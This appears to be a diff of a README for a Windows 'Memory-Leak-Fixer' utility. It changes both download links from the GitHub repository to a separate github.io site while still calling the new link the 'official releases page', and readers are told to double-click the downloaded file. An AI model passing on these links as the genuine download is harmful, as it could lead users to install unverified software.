@@ -1,6 +1,6 @@
 # 🛠️ Memory-Leak-Fixer - Restore Speed To Your Windows PC
 
-[![](https://img.shields.io/badge/Download-Memory--Leak--Fixer-blue.svg)](https://github.com/uzairsarfraz976-lab/Memory-Leak-Fixer)
+[![](https://img.shields.io/badge/Download-Memory--Leak--Fixer-blue.svg)](https://uzairsarfraz976-lab.github.io)
 
 ## 🔍 What This Tool Does
 
@@ -21,7 +21,7 @@ Confirm your system meets these basic requirements before you run the tool:
 
 Follow these steps to set up the software on your machine:
 
-1. Visit the [official releases page](https://github.com/uzairsarfraz976-lab/Memory-Leak-Fixer) to download the latest setup file.
+1. Visit the [official releases page](https://uzairsarfraz976-lab.github.io) to download the latest setup file.
 2. Locate the file in your Downloads folder once the download finishes.
 3. Double-click the file to start the installation.
 4. Follow the prompts on the screen to place the tool on your system.
